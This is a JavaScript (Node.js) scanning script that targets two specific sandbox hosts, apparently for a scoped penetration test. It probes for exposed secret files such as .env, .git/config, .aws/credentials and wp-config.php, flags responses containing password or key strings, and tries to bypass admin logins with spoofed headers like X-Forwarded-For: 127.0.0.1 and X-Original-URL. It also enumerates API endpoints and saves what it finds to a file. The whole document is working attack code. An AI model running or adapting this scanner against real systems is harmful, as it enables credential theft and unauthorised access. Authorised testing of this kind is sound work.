import { promises as dns } from 'node:dns';
import { request } from 'node:http';
import { request as httpsRequest } from 'node:https';
import { writeFileSync } from 'node:fs';

const SCOPE_IP = '188.34.187.32';
const HOSTS = ['sandbox.securegateway.com', 'sandbox-royal.securegateway.com'];
const SECRET_PATHS = ['/.env', '/.git/HEAD', '/.git/config', '/config.json', '/.aws/credentials', '/backup/', '/server-status', '/actuator/env', '/actuator/health', '/wp-config.php'];
const ADMIN_PATHS = ['/admin', '/administrator', '/dashboard', '/console', '/manager', '/login'];
const API_PATHS = ['/api', '/api/v1', '/api/users', '/graphql', '/swagger', '/swagger-ui', '/openapi.json'];
const BYPASS_HEADERS = {
  'X-Forwarded-For': '127.0.0.1',
  'X-Original-URL': '/admin',
  'X-Rewrite-URL': '/admin',
  'Referer': 'https://admin.securegateway.com/',
};

function fetch(url, opts = {}) {
  return new Promise((resolve, reject) => {
    const client = url.startsWith('https:') ? httpsRequest : request;
    const req = client(url, { method: 'GET', timeout: 8000, ...opts }, (res) => {
      let body = '';
      res.on('data', (c) => body += c);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body }));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
    req.end();
  });
}

async function resolveHost(host) {
  try {
    const addrs = await dns.resolve4(host);
    return addrs;
  } catch { return []; }
}

async function probeSecrets(host, protocol, port) {
  const findings = [];
  for (const path of SECRET_PATHS) {
    try {
      const url = `${protocol}://${host}:${port}${path}`;
      const res = await fetch(url);
      if (res.status === 200) {
        const hasSecret = /(password|secret|key|token|aws_access_key_id|private_key)/i.test(res.body);
        findings.push({ host, url, path, status: res.status, exposure: hasSecret ? 'secret-leak' : 'accessible-path', sample: res.body.slice(0, 200) });
      }
    } catch (e) {
      // ignore network errors
    }
  }
  return findings;
}

async function probeAdminBypass(host, protocol, port) {
  const findings = [];
  for (const path of ADMIN_PATHS) {
    try {
      const base = `${protocol}://${host}:${port}${path}`;
      const plain = await fetch(base);
      const isProtected = plain.status === 403 || plain.status === 401 || (plain.status === 200 && /login|sign in|authenticate/i.test(plain.body));
      if (!isProtected) {
        findings.push({ host, url: base, bypass: 'none', status: plain.status, note: 'directly accessible without auth' });
        continue;
      }
      for (const [hname, hval] of Object.entries(BYPASS_HEADERS)) {
        const bypassed = await fetch(base, { headers: { [hname]: hval } });
        if (bypassed.status === 200 && !/login|sign in|authenticate/i.test(bypassed.body)) {
          findings.push({ host, url: base, bypass: hname, status: bypassed.status, note: 'header bypass succeeded' });
          break;
        }
      }
    } catch (e) {
      // ignore
    }
  }
  return findings;
}

async function probeApi(host, protocol, port) {
  const findings = [];
  for (const path of API_PATHS) {
    try {
      const url = `${protocol}://${host}:${port}${path}`;
      const res = await fetch(url);
      if (res.status === 200) {
        findings.push({ host, url, path, status: res.status, sample: res.body.slice(0, 200) });
      }
    } catch (e) {
      // ignore
    }
  }
  return findings;
}

async function main() {
  const allFindings = [];
  for (const host of HOSTS) {
    const addrs = await resolveHost(host);
    const inScope = addrs.includes(SCOPE_IP);
    if (!inScope) {
      console.log(`SKIP ${host} -> resolves to ${addrs.join(', ')} (out of scope)`);
      continue;
    }
    console.log(`TARGET ${host} -> ${SCOPE_IP}`);
    // HTTP
    allFindings.push(...await probeSecrets(host, 'http', 80));
    allFindings.push(...await probeAdminBypass(host, 'http', 80));
    allFindings.push(...await probeApi(host, 'http', 80));
    // HTTPS
    allFindings.push(...await probeSecrets(host, 'https', 443));
    allFindings.push(...await probeAdminBypass(host, 'https', 443));
    allFindings.push(...await probeApi(host, 'https', 443));
  }
  writeFileSync('alsco-findings.json', JSON.stringify(allFindings, null, 2));
  console.log(`Wrote ${allFindings.length} raw observations to alsco-findings.json`);
}

main().catch(console.error);
